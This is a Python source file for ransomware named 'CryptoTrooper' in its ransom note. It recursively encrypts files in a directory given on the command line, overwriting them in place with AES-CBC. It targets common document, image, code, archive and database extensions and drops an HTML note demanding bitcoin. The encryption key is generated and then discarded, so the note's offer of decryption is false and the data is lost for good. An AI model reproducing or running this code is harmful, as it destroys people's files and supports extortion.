import random
import string
import Crypto
import Crypto.Random
from Crypto.Hash import SHA256
from Crypto.Cipher import AES
import threading
import os
import sys
import io
from os import walk
import multiprocessing
import secrets

encryption_timeout = int(sys.argv[2])
encrypted_symbol = "enc_"
ext = ('.jpg', '.png', '.bmp', '.raw', '.c', '.java', '.class', '.cpp', '.h', '.jar', '.txt', '.doc', '.docx', '.pdf', '.ptx', '.ppt', '.rar', '.zip', '.7z', '.mp3', '.mp4', '.mpg', '.mpeg', '.avi', '.tar.gz', '.sql', '.xml', '.py', '.js', '.php', '.pps', '.cs', '.xls', '.xlsx', '.3gp', '.mov', '.mkv', '.vob', '.wps', '.odt')
base_path = sys.argv[1]
ransom_message = "<html>\n\
	<style>\n\
		body{\n\
			background-image: url('bg.jpg');\n\
			background-size: cover;\n\
			color:white;\n\
		}\n\
	</style>\n\
	<body>\n\
		<b>!WARNING!</b><br><br>\n\
		<b>YOU ARE INFECTED</b><br>\n\
		<b>WITH THE MOST CRYPTOGRAPHICALLY ADVANCED RANSOMWARE</b><br>\n\
		<b>CryptoTrooper</b><br><br>\n\
		<b>All your data of all your users, all your databases and all your Websites are encrypted</b><br><br>\n\
		<b>You have one week to transfer 0.314 bitcoins to 4Kg7Cmooris7cLErTsijq6qR1FH3cTiK2H<b><br>\n\
		<b>After payment, send /key.enc and /key.iv to mail@host.net</b><br>\n\
		<b>You will receive the key to use with /decipher.sh</b>\n\
	</body>\n\
</html>"

def Encrypt(fileToEncrypt, iv, aes_obj):
    file_size = str(os.path.getsize(fileToEncrypt)).zfill(16)
    with open(fileToEncrypt, 'rb') as infile:
        bytesStream = io.BytesIO(file_size.encode('utf-8'))
        bytesStream.write(iv)
        while True:
            chunk = infile.read(64 * 1024)
            if len(chunk) == 0:
                break
            elif len(chunk) % 16 != 0:
                chunk += b' ' * (16 - (len(chunk) % 16))
            bytesStream.write(aes_obj.encrypt(chunk))
    return bytesStream

def EncryptFile(fileToEncrypt, key):
    dir_path, file_name = os.path.split(fileToEncrypt)
    iv = secrets.token_bytes(16)
    aes_obj = AES.new(key, AES.MODE_CBC, iv)
    encrypted_content_byte_stream = Encrypt(fileToEncrypt, iv, aes_obj)
    with open(fileToEncrypt, 'wb') as outfile:
        outfile.write(encrypted_content_byte_stream.getbuffer())

def EncryptAllFiles(filesToEncrypt, key):
    for file_to_encrypt in filesToEncrypt:
        EncryptFile(file_to_encrypt, key)

def GetAllFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + GetAllFiles(fullPath)
        else:
            if fullPath.endswith(ext):
                allFiles.append(fullPath)
    return allFiles

def WriteUserMessage():
    file_name = "ransom.pay"
    file_path = os.path.join(base_path, file_name)
    with open(file_path, 'w') as ransomFile:
        ransomFile.write(ransom_message)

def StartEncryption():
    files_to_encrypt = GetAllFiles(base_path)
    password = ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(32))
    key = SHA256.new(password.encode('utf-8')).digest()
    EncryptAllFiles(files_to_encrypt, key)
    WriteUserMessage()

###################### main ######################

enc_thread = multiprocessing.Process(target=StartEncryption)
enc_thread.daemon = True
enc_thread.start()
enc_thread.join(encryption_timeout)

if enc_thread.is_alive():
    print("terminated")
    enc_thread.terminate()
    enc_thread.join()
